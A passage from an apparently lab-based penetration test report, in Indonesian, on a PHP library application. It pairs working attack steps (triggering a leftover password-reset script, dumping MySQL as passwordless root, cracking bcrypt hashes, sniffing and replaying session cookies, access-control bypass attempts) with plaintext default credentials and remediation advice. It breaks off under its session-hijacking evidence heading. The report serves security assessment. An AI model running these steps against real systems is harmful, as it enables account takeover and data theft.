# LAPORAN PENTEST - Aplikasi Perpustakaan Digital (UK1-Diki)

- **Target:** `http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/`
- **Setup Lab:** Aplikasi berjalan di **Windows (XAMPP/Laragon)**, Attacker di **Kali Linux**
- **Tanggal:** 28 September 2026
- **Tester:** gh0st4n
- **Metodologi:** Black-box → White-box (setelah recovery source code via `.git` & GitHub)

## Daftar Isi

- [1. Ringkasan Eksekutif](#1-ringkasan-eksekutif)
- [2. Lingkup & Setup Lab](#2-lingkup--setup-lab)
- [3. Metodologi & Reconnaissance](#3-metodologi--reconnaissance)
  - [3.1 Tools](#31-tools)
  - [3.2 Reconnaissance](#32-reconnaissance)
- [4. Temuan](#4-temuan)
  - [4.1 Backdoor Reset Password (CRITICAL)](#41-backdoor-reset-password-critical)
  - [4.2 Kredensial Database Hardcoded — root Tanpa Password (CRITICAL)](#42-kredensial-database-hardcoded--root-tanpa-password-critical)
  - [4.3 Source Code Bocor via GitHub Public Repo (HIGH)](#43-source-code-bocor-via-github-public-repo-high)
  - [4.4 .git Directory Bisa Diakses (HIGH)](#44-git-directory-bisa-diakses-high)
  - [4.5 Session Hijacking via HTTP Sniffing (HIGH)](#45-session-hijacking-via-http-sniffing-high)
  - [4.6 Database SQL Dump Tersedia di Source Code (MEDIUM)](#46-database-sql-dump-tersedia-di-source-code-medium)
  - [4.7 Backup Folder `perpus_work/` Tidak Dihapus (MEDIUM)](#47-backup-folder-perpus_work-tidak-dihapus-medium)
  - [4.8 Informasi Server Bocor (LOW)](#48-informasi-server-bocor-low)
- [5. Vektor yang Diuji & Aman](#5-vektor-yang-diuji--aman)
- [6. Matriks Risiko](#6-matriks-risiko)
- [7. Rekomendasi Perbaikan](#7-rekomendasi-perbaikan)
- [8. Panduan Aman Push ke GitHub](#8-panduan-aman-push-ke-github)
- [9. Lampiran](#9-lampiran)

## 1. Ringkasan Eksekutif

Aplikasi **Perpustakaan Digital (UK1-Diki)** memiliki **2 temuan Critical**, **3 High**, **2 Medium**, dan **1 Low**. Temuan paling berdampak adalah **backdoor `reset_password.php`** yang masih aktif di server, memungkinkan penyerang **mereset semua password akun tanpa autentikasi**. Ditambah lagi, **kredensial database (`root` tanpa password)** bocor di source code dan **repo GitHub public** yang berisi source code lengkap + kredensial.

Selain itu, aplikasi juga **rentan terhadap Session Hijacking** karena berjalan di **HTTP tanpa TLS/SSL**. Penyerang di jaringan yang sama dapat melakukan **sniffing** menggunakan Wireshark, menangkap cookie `PHPSESSID`, dan **login sebagai admin, petugas, atau user lain** tanpa perlu password.

Dengan kombinasi temuan ini, penyerang bisa **login sebagai admin**, **mengakses database secara penuh**, dan **mengambil alih aplikasi**.

Meskipun aplikasi sudah menerapkan **prepared statement**, **CSRF token dengan `hash_equals()`**, **role-based access control**, dan **whitelist ekstensi upload** dengan baik, **kebocoran source code, backdoor yang lupa dihapus, dan HTTP tanpa TLS** membuat pertahanan tersebut menjadi tidak relevan.

**Prioritas perbaikan:**
1. Hapus file `login/reset_password.php` dari server
2. Rotasi seluruh password (admin, petugas, user, DB)
3. **Aktifkan HTTPS (TLS/SSL)** — untuk mencegah session hijacking
4. Private-kan repo GitHub + hapus credential dari git history
5. Blokir akses ke `.git` di web server
6. Ganti password MySQL `root` (jangan kosong)
7. Terapkan praktik aman push ke GitHub (lihat [Bagian 8](#8-panduan-aman-push-ke-github))

## 2. Lingkup & Setup Lab

| Komponen       | Detail                                             |
|----------------|----------------------------------------------------|
| **Aplikasi**   | Perpustakaan Digital (PHP 8.1.10 + MySQL)          |
| **Web Server** | Apache/2.4.54 (Win64) — XAMPP/Laragon              |
| **Target IP**  | `192.168.1.12`                                     |
| **Attacker**   | Kali Linux (VM)                                    |
| **Jaringan**   | Bridged / Host-Only (satu subnet `192.168.1.x`)    |
| **Scope**      | `http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/`  |
| **Source**     | `https://github.com/gh0st4n/UK1-Diki` (public)     |
| **Parent**     | `https://github.com/agustiandiki7-a11y/perpustakaan-v2` |

## 3. Metodologi & Reconnaissance

### 3.1 Tools
- `feroxbuster` — directory & file brute-force
- `arjun` — parameter discovery
- `hakrawler` + `katana` — crawling
- `dalfox` — XSS scanning
- `git-dumper` — recovery `.git`
- `sqlmap` — SQL injection scanning (gagal — target aman)
- `wireshark` / `tcpdump` — network sniffing
- `curl`, `nmap`, browser — manual testing

### 3.2 Reconnaissance

```bash
feroxbuster -u http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -x php,html -s 200,302 --silent -d 2 -o ferox_clean.txt
```

**Hasil menarik:**
```
200  .git/HEAD                              → Git exposed
200  .git/config                            → Remote GitHub bocor
200  login/pages/login.php
200  login/pages/register.php
200  login/reset_password.php               → BACKDOOR!
200  backend/logout.php
200  index.php
301  assets/uploads/cover/                  → File upload aktif
```

**Hasil crawling (`hakrawler` + `katana`):**
```
http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/login/function/proses_login.php
http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/login/function/proses_register.php
http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/login/pages/login.php
http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/login/pages/register.php
http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/backend/logout.php
http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/index.php
```

**Hasil `curl` — server info:**
```
HTTP/1.1 302 Found
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1q PHP/8.1.10
X-Powered-By: PHP/8.1.10
Location: /UK-PKL_Banjar/UK1/UK1-Diki/login/pages/login.php
```

**Catatan developer (`note.txt`) yang ditemukan di server:**
```
admin : admin123
petugas1 : petugas123
Dapat memilih tanggal yang sudah lalu
```

## 4. Temuan

### 4.1 Backdoor Reset Password (CRITICAL)

**Deskripsi:**
File `login/reset_password.php` masih ada di server dan bisa diakses **tanpa autentikasi**. File ini me-reset password akun `admin`, `petugas1`, dan `budi` ke nilai default. Di dalam source code ada komentar: `SCRIPT SEKALI PAKAI — HAPUS FILE INI SETELAH DIPAKAI!` — tapi developer **lupa menghapusnya**.

**URL:** `http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/login/reset_password.php`

#### 🔧 Step-by-Step Exploit

**Step 1 — Cek apakah file masih ada:**
```bash
curl -I http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/login/reset_password.php
```

**Response:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1q PHP/8.1.10
```

**Step 2 — Eksekusi backdoor:**
```bash
curl http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/login/reset_password.php
```

**Response:**
```html
<h3>Reset Password</h3><ul>
<li>admin: berhasil di-reset ✅</li>
<li>petugas1: berhasil di-reset ✅</li>
<li>budi: berhasil di-reset ✅</li></ul>
<p><strong>PENTING: hapus file reset_password.php ini sekarang juga!</strong></p>
```

**Step 3 — Login sebagai admin:**
```
URL: http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/login/pages/login.php
Username: admin
Password: admin123
```

**Credential yang Didapat:**

| Role     | Username   | Password       | Status         |
|----------|------------|----------------|----------------|
| Admin    | `admin`    | `admin123`     | Login berhasil |
| Petugas  | `petugas1` | `petugas123`   | Valid          |
| Peminjam | `budi`     | `peminjam123`  | Valid          |

**Source code backdoor (`login/reset_password.php`):**
```php
<?php
/**
 * SCRIPT SEKALI PAKAI — HAPUS FILE INI SETELAH DIPAKAI!
 */
require_once __DIR__ . '/../app/config/Database.php';

$akun = [
    'admin'    => 'admin123',
    'petugas1' => 'petugas123',
    'budi'     => 'peminjam123',
];

try {
    $db = (new Database())->connect();
    echo "<h3>Reset Password</h3><ul>";
    foreach ($akun as $username => $passwordBaru) {
        $hash = password_hash($passwordBaru, PASSWORD_DEFAULT);
        $stmt = $db->prepare('UPDATE users SET password = :password WHERE username = :username');
        $stmt->execute([':password' => $hash, ':username' => $username]);
        $affected = $stmt->rowCount();
        echo "<li>{$username}: " . ($affected > 0 ? "berhasil di-reset ✅" : "username gak ketemu ❌") . "</li>";
    }
    echo "</ul><p><strong>PENTING: hapus file reset_password.php ini sekarang juga!</strong></p>";
} catch (PDOException $e) {
    echo 'Gagal konek database: ' . htmlspecialchars($e->getMessage());
}
```

**Dampak:**
- Semua akun bisa di-reset tanpa autentikasi
- Penyerang bisa login sebagai admin → **full access**
- CRUD buku, kategori, pengguna, peminjaman, pengembalian

**Severity:** 🔴 **CRITICAL** (CVSS 9.8)

#### 🛡️ Mitigasi

1. **Hapus file** `login/reset_password.php` dari server:
   ```bash
   rm /path/to/webroot/login/reset_password.php
   ```

2. **Jangan pernah** menyimpan script sekali pakai di webroot — taruh di luar document root atau jalankan via CLI:
   ```bash
   php /path/to/scripts/reset_password.php
   ```

3. **Tambahkan rule** di `.htaccess` untuk blokir akses file sensitif:
   ```apache
   <FilesMatch "^(reset_password|fix|test|debug)\.php$">
       Require all denied
   </FilesMatch>
   ```

4. **Rotasi semua password** setelah file dihapus.

### 4.2 Kredensial Database Hardcoded — root Tanpa Password (CRITICAL) [Konfigurasi ini jalan secara lokal]

**Deskripsi:**
Kredensial MySQL `root` **tanpa password** di-hardcode di source code (`app/config/Database.php` dan `frontend/database/connection.php`).

**Source code (`app/config/Database.php`):**
```php
class Database
{
    private string $host     = 'localhost';
    private string $dbName   = 'perpustakaan-v2';
    private string $username = 'root';
    private string $password = '';   // ← KOSONG!
```

**Konfirmasi dari `REVISI.md` (git history commit `2412388`):**
```markdown
Database:
- Konfigurasi koneksi ada di `app/config/Database.php`.
- Default koneksi: MySQL `localhost`, user `root`, password kosong, database `perpustakaan-v2`.
```

#### 🔧 Step-by-Step Exploit

**Step 1 — Cek port MySQL terbuka:**
```bash
nmap -p 3306 192.168.1.12
```

**Step 2 — Connect langsung sebagai root:**
```bash
mysql -h 192.168.1.12 -u root --skip-ssl
```

**Step 3 — Dump seluruh database:**
```bash
mysqldump -h 192.168.1.12 -u root --skip-ssl --all-databases > dump_all.sql
```

**Step 4 — Cari data sensitif:**
```sql
USE `perpustakaan-v2`;
SHOW TABLES;
SELECT * FROM users;
SELECT * FROM books;
-- Cari tabel/kolom dengan nama mencurigakan
SELECT table_name, column_name FROM information_schema.columns 
WHERE table_schema='perpustakaan-v2';
```

**Dampak:**
- Akses penuh ke database
- Dump data user (termasuk hash password)
- Modifikasi / hapus data
- Potensi RCE via `INTO OUTFILE` (kalau `secure_file_priv` kosong)

**Severity:** 🔴 **CRITICAL** (CVSS 9.1)

#### 🛡️ Mitigasi

1. **Ganti password MySQL root** — jangan kosong:
   ```sql
   ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongP@ssw0rd!2026';
   FLUSH PRIVILEGES;
   ```

2. **Batasi akses MySQL** — hanya dari `localhost`:
   ```sql
   SELECT user, host FROM mysql.user;
   DROP USER 'root'@'%';
   ```

3. **Pindahkan kredensial ke environment variable** (`.env`):
   ```php
   $this->username = $_ENV['DB_USER'];
   $this->password = $_ENV['DB_PASS'];
   ```

4. **Buat user MySQL khusus** dengan hak akses terbatas:
   ```sql
   CREATE USER 'perpus_app'@'localhost' IDENTIFIED BY 'StrongP@ss!';
   GRANT SELECT, INSERT, UPDATE, DELETE ON `perpustakaan-v2`.* TO 'perpus_app'@'localhost';
   FLUSH PRIVILEGES;
   ```

5. **Blokir port 3306** dari luar di firewall:
   ```bash
   netsh advfirewall firewall add rule name="Block MySQL" dir=in action=block protocol=TCP localport=3306
   ```

### 4.3 Source Code Bocor via GitHub Public Repo (HIGH)

**Deskripsi:**
Repo GitHub `gh0st4n/UK1-Diki` **public** dan berisi **source code lengkap** aplikasi perpustakaan, termasuk kredensial. Repo ini adalah fork dari `agustiandiki7-a11y/perpustakaan-v2` yang juga public.

**URL:** `https://github.com/gh0st4n/UK1-Diki`

#### 🔧 Step-by-Step Exploit

**Step 1 — Cek apakah repo public via API:**
```bash
curl -s https://api.github.com/repos/gh0st4n/UK1-Diki | jq .
```

**Response (ringkas):**
```json
{
  "name": "UK1-Diki",
  "full_name": "gh0st4n/UK1-Diki",
  "private": false,
  "clone_url": "https://github.com/gh0st4n/UK1-Diki.git",
  "default_branch": "pentest",
  "parent": {
    "full_name": "agustiandiki7-a11y/perpustakaan-v2"
  }
}
```

**Step 2 — Clone repo:**
```bash
git clone https://github.com/gh0st4n/UK1-Diki.git
cd UK1-Diki
```

**Step 3 — Cari kredensial di git history:**
```bash
git log --all --full-history -- "*.env" "*.sql" "*.md"
git show 2412388:REVISI.md
```

**Output `REVISI.md`:**
```markdown
Database:
- Konfigurasi koneksi ada di `app/config/Database.php`.
- Default koneksi: MySQL `localhost`, user `root`, password kosong, database `perpustakaan-v2`.
```

**Step 4 — Baca kredensial dari source code:**
```bash
cat app/config/Database.php
cat frontend/database/connection.php
```

**Step 5 — Cari kredensial user di SQL dump:**
```bash
cat backend/assets/database.sql | grep -A 5 "INSERT INTO users"
```

**Output:**
```sql
-- admin    / admin123
-- petugas1 / petugas123
-- budi     / peminjam123
INSERT INTO users (nama, username, email, password, role) VALUES
('Administrator', 'admin', 'admin@perpustakaan.test', '$2y$10$nPSQAd/...', 'admin'),
('Rina Petugas', 'petugas1', 'petugas1@perpustakaan.test', '$2y$10$j07biTpr...', 'petugas'),
('Budi Santoso', 'budi', 'budi@mail.test', '$2y$10$riHfiOsGit...', 'peminjam');
```

**Dampak:**
- Source code lengkap bisa dianalisis penyerang
- Kredensial DB & user bocor
- Git history bocorin `REVISI.md` yang berisi kredensial
- Memudahkan eksploitasi lebih lanjut (RCE, bypass auth, dll)

**Severity:** 🟠 **HIGH** (CVSS 8.2)

#### 🛡️ Mitigasi

1. **Private-kan repo GitHub:**
   - Repo → Settings → General → Danger Zone → Change visibility → Private

2. **Hapus credential dari git history** (lihat [Bagian 8.5](#85-kalau-sudah-terlanjur-commit--bersihkan-history)):
   ```bash
   git filter-repo --path backend/assets/database.sql --invert-paths
   git filter-repo --path REVISI.md --invert-paths
   git push origin --force --all
   ```

3. **Rotasi semua password** yang bocor (admin, petugas, user, DB).

4. **Ikuti panduan aman push ke GitHub** di [Bagian 8](#8-panduan-aman-push-ke-github).

### 4.4 .git Directory Bisa Diakses (HIGH)

**Deskripsi:**
Folder `.git` dapat diakses publik via HTTP, memungkinkan recovery sebagian metadata repo (config, HEAD, index).

**URL:** `http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/.git/`

#### 🔧 Step-by-Step Exploit

**Step 1 — Cek akses `.git`:**
```bash
curl -I http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/.git/
```
Response: `403 Forbidden` (directory listing mati)

**Step 2 — Akses file individual:**
```bash
curl http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/.git/HEAD
# Output: ref: refs/heads/main

curl http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/.git/config
```

**Output `.git/config`:**
```ini
[core]
    repositoryformatversion = 0
    filemode = false
    bare = false
    logallrefupdates = true
    symlinks = false
    ignorecase = true
[remote "origin"]
    url = https://github.com/gh0st4n/UK1-Diki
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
    remote = origin
    merge = refs/heads/main
```

**Step 3 — Dump `.git` pakai `git-dumper`:**
```bash
git-dumper http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/.git/ ./diki_source
```

**Hasil:**
- `.git/HEAD`, `.git/config`, `.git/index`, `.git/logs/HEAD`, `.git/packed-refs` → **berhasil**
- `.git/objects/*` → **404 (diblokir)** → source code **gagal di-dump**

**Step 4 — Pakai remote URL untuk clone dari GitHub:**
```bash
git clone https://github.com/gh0st4n/UK1-Diki.git
```

**Dampak:**
- Remote URL bocor → mengarah ke repo GitHub public
- Attacker bisa langsung clone source code dari GitHub
- Walaupun `.git/objects` diblokir, info yang bocor cukup untuk pivot ke GitHub

**Severity:** 🟠 **HIGH** (CVSS 7.5)

#### 🛡️ Mitigasi

1. **Blokir akses `.git` di Apache:**
   ```apache
   # .htaccess di root
   RedirectMatch 404 /\.git
   ```
   Atau di VirtualHost:
   ```apache
   <DirectoryMatch "^/.*/\.git/">
       Require all denied
   </DirectoryMatch>
   ```

2. **Untuk Nginx:**
   ```nginx
   location ~ /\.git { deny all; }
   ```

3. **Pastikan `.git` tidak ada di document root** — taruh project di luar webroot, atau hapus `.git` setelah deploy:
   ```bash
   rm -rf /path/to/webroot/.git
   ```

### 4.5 Session Hijacking via HTTP Sniffing (HIGH)

**Deskripsi:**
Aplikasi berjalan di **HTTP (tanpa TLS/SSL)**, sehingga cookie `PHPSESSID` dikirim dalam bentuk **plaintext** di jaringan. Penyerang yang berada di **jaringan yang sama** (LAN/WiFi) bisa melakukan **sniffing** menggunakan Wireshark/tcpdump, menangkap cookie session, dan **menggunakannya untuk login sebagai user lain** — termasuk admin & petugas.

**Severity:** 🟠 **HIGH** (CVSS 8.1)

#### 🔧 Step-by-Step Exploit

**Step 1 — Attacker di jaringan yang sama:**
- Posisi: LAN yang sama dengan target (`192.168.1.x`)
- Tool: **Wireshark** / **tcpdump** / **ettercap**

**Step 2 — Start sniffing di interface yang tepat:**
```bash
# Di Kali — sniff traffic HTTP di interface eth0/eth1
sudo tcpdump -i eth1 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

Atau pakai **Wireshark** (GUI):
1. Buka Wireshark → pilih interface
2. Filter: `http.cookie`
3. Tunggu ada user login
4. **Klik kanan → Follow → HTTP Stream**
5. **Cookie `PHPSESSID` bakal keliatan**

**Step 3 — Contoh cookie yang tertangkap:**
```
GET /UK-PKL_Banjar/UK1/UK1-Diki/index.php HTTP/1.1
Host: 192.168.1.12
User-Agent: Mozilla/5.0 ...
Cookie: PHPSESSID=4n6oejviie5hn43m4enln66s7p
```

**Cookie `PHPSESSID=4n6oejviie5hn43m4enln66s7p`** — ini **session token valid** milik user yang lagi login.

**Step 4 — Inject cookie ke browser attacker:**

**Cara A: Via Browser DevTools**
1. Buka `http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/`
2. Buka **DevTools** (F12) → **Application** → **Cookies**
3. Edit cookie `PHPSESSID` → ganti nilainya dengan yang didapat dari sniffing
4. Refresh halaman → **lu login sebagai user tersebut!**

**Cara B: Via `curl`**
```bash
# Akses halaman admin dengan cookie curian
curl -b "PHPSESSID=4n6oejviie5hn43m4enln66s7p" \
  http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/backend/admin/index.php
```

**Cara C: Via Browser Extension**
- Install **Cookie Editor** (Chrome/Firefox)
- Import cookie curian
- Refresh → **login sebagai user**

**Step 5 — Verifikasi login:**
```bash
# Test akses halaman yang butuh login
curl -b "PHPSESSID=<COOKIE_CURIAN>" \
  http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/backend/admin/index.php

# Kalau response 200 OK + HTML dashboard → BERHASIL
# Kalau 302 redirect ke login → cookie expired
```

**Step 6 — Dampak:**

Dengan cookie curian, attacker bisa:
- ✅ Login sebagai **admin** → akses **full control**
- ✅ Login sebagai **petugas** → akses fitur petugas
- ✅ Login sebagai **user** → akses data pribadi user
- ✅ **CRUD** data (buku, user, peminjaman)
- ✅ **Upload file** (kalau bisa upload shell)
- ✅ **Hapus data** (destructive)

#### 🎯 Skenario Serangan

1. **Admin login** ke aplikasi dari komputer A
2. **Attacker** berada di jaringan yang sama, sniffing dengan Wireshark
3. **Cookie `PHPSESSID`** milik admin tertangkap
4. Attacker **inject cookie** ke browser sendiri
5. Attacker **login sebagai admin** tanpa perlu password
6. Attacker bisa **modifikasi data** atau **bikin backdoor**

#### 🛡️ Mitigasi

1. **Aktifkan HTTPS (TLS/SSL) — WAJIB:**
   ```apache
   # Apache VirtualHost
   <VirtualHost *:443>
       SSLEngine on
       SSLCertificateFile /path/to/cert.pem
       SSLCertificateKeyFile /path/to/key.pem
       ...
   </VirtualHost>
   ```

2. **Redirect HTTP → HTTPS:**
   ```apache
   <VirtualHost *:80>
       Redirect permanent / https://192.168.1.12/
   </VirtualHost>
   ```

3. **Set cookie flag `Secure`:**
   ```php
   session_set_cookie_params([
       'secure' => true,        // hanya dikirim via HTTPS
       'httponly' => true,      // nggak bisa diakses JS
       'samesite' => 'Strict',  // proteksi CSRF
   ]);
   ```

4. **Regenerasi session ID setelah login:**
   ```php
   session_regenerate_id(true);
   ```

5. **Session timeout** yang wajar (15-30 menit idle):
   ```php
   if (isset($_SESSION['last_activity']) && 
       (time() - $_SESSION['last_activity'] > 1800)) {
       session_unset();
       session_destroy();
       header('Location: login.php?expired=1');
       exit;
   }
   $_SESSION['last_activity'] = time();
   ```

6. **Bind session ke IP + User-Agent:**
   ```php
   $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
   $_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];
   
   // Validasi di setiap request
   if ($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR'] || 
       $_SESSION['ua'] !== $_SERVER['HTTP_USER_AGENT']) {
       session_destroy();
       header('Location: login.php');
       exit;
   }
   ```

7. **Gunakan HSTS (HTTP Strict Transport Security):**
   ```apache
   Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
   ```

### 4.6 Database SQL Dump Tersedia di Source Code (MEDIUM)

**Deskripsi:**
File `backend/assets/database.sql` ikut ter-commit ke repo, berisi struktur DB + data user + hash password.

**File:** `backend/assets/database.sql`

#### 🔧 Step-by-Step Exploit

**Step 1 — Baca SQL dump:**
```bash
cat backend/assets/database.sql
```

**Step 2 — Extract hash password:**
```bash
grep -A 5 "INSERT INTO users" backend/assets/database.sql
```

**Step 3 — Crack hash (kalau perlu):**
```bash
echo '$2y$10$nPSQAd/jI3RqzUMVkTCj0.I4Z9Ea6zYew/ZRwViieKL6/Ys.eHxMK' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Dampak:**
- Struktur DB bocor
- Hash password user bocor
- Memudahkan cracking (kalau password lemah)

**Severity:** 🟡 **MEDIUM** (CVSS 6.5)

#### 🛡️ Mitigasi

1. **Hapus file SQL dari repo:**
   ```bash
   git rm --cached backend/assets/database.sql
   echo "*.sql" >> .gitignore
   git commit -m "Remove SQL dump from repo"
   ```

2. **Hapus dari git history:**
   ```bash
   git filter-repo --path backend/assets/database.sql --invert-paths
   ```

3. **Jangan commit file `.sql`** ke repo — simpan di server aman / password manager.

4. **Rotasi password** yang hash-nya bocor.

### 4.7 Backup Folder `perpus_work/` Tidak Dihapus (MEDIUM)

**Deskripsi:**
Folder `perpus_work/` adalah backup code lama yang tidak dihapus. Folder ini diblokir `.htaccess` (`Require all denied`), tapi masih ada di server dan bisa jadi attack surface kalau `.htaccess` di-bypass.

**Folder:** `perpus_work/`

#### 🔧 Step-by-Step Exploit

**Step 1 — Cek akses:**
```bash
curl -I http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/perpus_work/
```
Response: `403 Forbidden`

**Step 2 — Coba bypass `.htaccess`:**
```bash
# Case sensitivity
curl http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/PERPUS_WORK/
curl http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/Perpus_Work/

# Path traversal
curl http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/perpus_work/./backend/shared/dashboard.php
curl http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/perpus_work/%2e/backend/shared/dashboard.php

# Double encoding
curl http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/perpus_work%2fbackend%2fshared%2fdashboard.php
```

**Dampak:**
- Backup code lama bisa bocor (kalau bypass berhasil)
- Attack surface tambahan

**Severity:** 🟡 **MEDIUM** (CVSS 5.3)

#### 🛡️ Mitigasi

1. **Hapus folder** `perpus_work/` dari server:
   ```bash
   rm -rf /path/to/webroot/perpus_work/
   ```

2. **Jangan simpan backup** di document root — taruh di luar webroot.

3. **Tambahkan rule `.htaccess`** yang lebih ketat:
   ```apache
   <DirectoryMatch "^/.*/(perpus_work|backup|old|bak)/">
       Require all denied
   </DirectoryMatch>
   ```

### 4.8 Informasi Server Bocor (LOW)

**Deskripsi:**
Header HTTP bocorin versi server, PHP, dan OS.

**Response header:**
```
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1q PHP/8.1.10
X-Powered-By: PHP/8.1.10
```

#### 🔧 Step-by-Step Exploit

**Step 1 — Cek header:**
```bash
curl -I http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/
```

**Step 2 — Cari exploit untuk versi tersebut:**
- Apache 2.4.54 → cek CVE
- PHP 8.1.10 → cek CVE
- OpenSSL 1.1.1q → cek CVE

**Dampak:**
- Attacker tau versi software → cari exploit yang sesuai
- Memudahkan reconnaissance

**Severity:** 🟢 **LOW** (CVSS 3.7)

#### 🛡️ Mitigasi

1. **Sembunyikan versi server** di Apache:
   ```apache
   ServerTokens Prod
   ServerSignature Off
   ```

2. **Sembunyikan versi PHP** di `php.ini`:
   ```ini
   expose_php = Off
   ```

3. **Update software** ke versi terbaru.

## 5. Vektor yang Diuji & Aman

| Vektor                          | Status        | Bukti                                                                 |
|---------------------------------|---------------|-----------------------------------------------------------------------|
| **SQL Injection**               | ✅ Aman      | Semua query pakai `prepare()` + `bindParam()` / `execute()`           |
| **XSS (Reflected)**             | ✅ Aman      | Output di-escape `htmlspecialchars($var, ENT_QUOTES, 'UTF-8')`        |
| **XSS (Stored)**                | ✅ Aman      | Kategori `<script>alert(1)</script>` disimpan tapi di-escape jadi `&lt;script&gt;` |
| **CSRF**                        | ✅ Aman      | Token + `hash_equals()` di semua form                                 |
| **BAC (Broken Access Control)** | ✅ Aman      | Role check di `backend/layouts/header.php` via `cekRole([$routeRole])` |
| **Session Fixation**            | ✅ Aman      | `session_regenerate_id(true)` setelah login                           |
| **Command Injection**           | ✅ Aman      | Tidak ada `exec()`, `system()`, `shell_exec()`                        |
| **LFI / RFI**                   | ✅ Aman      | Semua `include` / `require` statis                                    |
| **File Upload → RCE**           | ✅ Aman      | Whitelist ekstensi (`jpg`, `jpeg`, `png`) + nama file di-random       |
| **Weak Hash**                   | ✅ Aman      | `password_hash($password, PASSWORD_DEFAULT)` + `password_verify()`    |
| **fix.php Backdoor**            | ✅ Tidak ada | Sudah dihapus dari server                                             |
| **IDOR**                        | ✅ Tidak ada | `pinjam.php?id=19` bisa diakses user manapun (by design)              |
| **Session Hijacking via HTTP**  | ❌ **VULNERABLE** | Cookie `PHPSESSID` tertangkap via Wireshark, berhasil di-inject ke browser |
| **Session Cookie Flags**        | ⚠️ **PARTIAL** | `HttpOnly` & `SameSite=Strict` ada, tapi `Secure` **TIDAK ADA** (HTTP) |

### Detail Bukti XSS Stored (Aman)

Parameter `liveSearchInput` di `index.php` di-test dengan payload:
```bash
curl "http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/index.php?liveSearchInput=<script>alert(1)</script>"
```

Hasil: **tidak ada XSS** karena output di-escape.

Selain itu, kategori yang di-inject `<script>alert(1)</script>` (via fitur admin) juga **di-escape**:
```html
<button class="kategori-chip" data-kategori-id="16">
    &lt;script&gt;alert(1)&lt;/script&gt;
</button>
```

**Kesimpulan:** Output encoding berjalan dengan baik. Aplikasi **tidak vulnerable** terhadap XSS.

### Detail Bukti SQL Injection (Aman)

Test login bypass:
```bash
curl -X POST http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/login/function/proses_login.php \
  -d "username=admin'-- -&password=x&csrf_token=VALID"
```

**Hasil:** Tidak berhasil login. Query menggunakan `prepare()` + `bindParam()`:
```php
$stmt = $db->prepare('SELECT id, nama, username, email, password, role FROM users WHERE username = :username LIMIT 1');
$stmt->execute([':username' => $username]);
```

**Kesimpulan:** Aplikasi **tidak vulnerable** terhadap SQL Injection.

### Detail Bukti SQLMap (Gagal)

SQLMap dijalankan di `pinjam.php?id=19` dengan cookie valid:
```bash
sqlmap -u "http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/frontend/page/pinjam.php?id=19" \
  --cookie="PHPSESSID=<valid>" --dbs --batch --level=3 --risk=2
```

**Hasil:**
```
[WARNING] GET parameter 'id' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable
```

**Kesimpulan:** SQLMap **gagal** karena:
1. Parameter `id` di-cast ke integer (`(int) $_GET['id']`)
2. Query pakai prepared statement
3. Tidak ada SQL Injection

### Detail Bukti File Upload (Aman)

Source code upload handler (`backend/shared/buku_proses.php`):
```php
$fileExtension = strtolower(pathinfo($_FILES['cover']['name'], PATHINFO_EXTENSION));
$allowedExtensions = ['jpg', 'jpeg', 'png'];

if (!in_array($fileExtension, $allowedExtensions, true)) {
    return [null, 'Format cover harus JPG, JPEG, atau PNG.'];
}

$newFileName = 'cover_' . time() . '_' . bin2hex(random_bytes(6)) . '.' . $fileExtension;
```

**Kesimpulan:**
- Whitelist extension ketat
- Nama file di-random (nggak bisa predict)
- Path upload di `/assets/uploads/cover/` — file `.jpg`/`.png` nggak di-execute sebagai PHP

Aplikasi **tidak vulnerable** terhadap RCE via file upload.

### Detail Bukti Session Hijacking (VULNERABLE)

Aplikasi berjalan di **HTTP** (bukan HTTPS), sehingga cookie `PHPSESSID` dikirim **plaintext**. Attacker di jaringan yang sama bisa sniff dengan Wireshark:

```bash
# Sniffing cookie
sudo tcpdump -i eth1 -A -s 0 'tcp port 80' | grep -i "phpsessid"
```

**Hasil:**
```
